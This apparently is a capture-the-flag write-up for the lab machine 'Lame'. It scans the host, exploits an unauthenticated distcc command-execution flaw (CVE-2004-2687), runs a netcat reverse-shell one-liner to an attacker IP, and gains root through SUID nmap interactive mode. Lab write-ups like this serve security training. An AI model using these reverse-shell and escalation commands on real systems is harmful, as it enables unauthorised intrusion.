# Lame

## Nmap

```
sudo nmap 10.10.10.3 -p- -sS -sV  

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Looking at the results I first checked `FTP`. Anonymous login was confirmed working however, no files or folder was contained in the `FTP` and as shown below file upload was unsuccessful.

![](<../../../.gitbook/assets/image (1640).png>)

Using `searchsploit` against the version of vsftpd running (2.3.4) we see this is vulnerable to a Backdoor Command Execution exploit.

![](<../../../.gitbook/assets/image (1641).png>)

However, trying various exploits I was unable to get successful exploitation.

![](<../../../.gitbook/assets/image (1642).png>)

Looking at `nmap` on port 3632 we do have distcc deamon running. **distcc** is a tool for speeding up compilation of source code by using distributed computing over a computer network. With the right configuration, distcc can dramatically reduce a project's compilation time.

Looking for exploits we see that an unauthenticated RCE exists given CVE-2004-2687 for this daemon.

**Description:**

distcc 2.x, as used in XCode 1.5 and others, when not configured to restrict access to the server port, allows remote attackers to execute arbitrary commands via compilation jobs, which are executed by the server without authorization checks.

Researching for exploits on GitHub we come to: [https://gist.github.com/ypcrts/12522c1cf6afda03a4f774bcf4d8e940](https://gist.github.com/ypcrts/12522c1cf6afda03a4f774bcf4d8e940)

I downloaded the exploit and executed with the following command:

```
sudo python2 exploit.py -t 10.10.10.3 -c id
```

![](<../../../.gitbook/assets/image (1644).png>)

With confirmed command executed we can now attempt to gain a proper reverse shell. First start a `netcat` listener on the attacking machine:

```
sudo nc -lvp 4444
```

Then check to see if `nc` is installed on the target machine:

```
sudo python2 exploit.py -t 10.10.10.3 -c 'which nc' 
```

![](<../../../.gitbook/assets/image (1645).png>)

With `nc` confirmed installed on the target machine run the command below to spawn a reverse shell to the attacking machine `netcat` listener.

```
sudo python2 exploit.py -t 10.10.10.3 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.29 4444 >/tmp/f'
```

![](<../../../.gitbook/assets/image (1646).png>)

Where we will then catch a reverse shell.

![](<../../../.gitbook/assets/image (1647).png>)

Now on the target machine I uploaded linpeas.sh through a Python SimpleHTTPServer and after running we find the binary nmap has the SUID bit set.

![](<../../../.gitbook/assets/image (1648).png>)

Checking this binary against [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/) shows this can be abused to spawn a system shell.

![](<../../../.gitbook/assets/image (1649).png>)

I then executed `nmap` in interactive mode then escaped to a system shell to gain shell as root.

```
/usr/bin/nmap --interactive
nmap> !sh
```

![](<../../../.gitbook/assets/image (1650).png>)

***
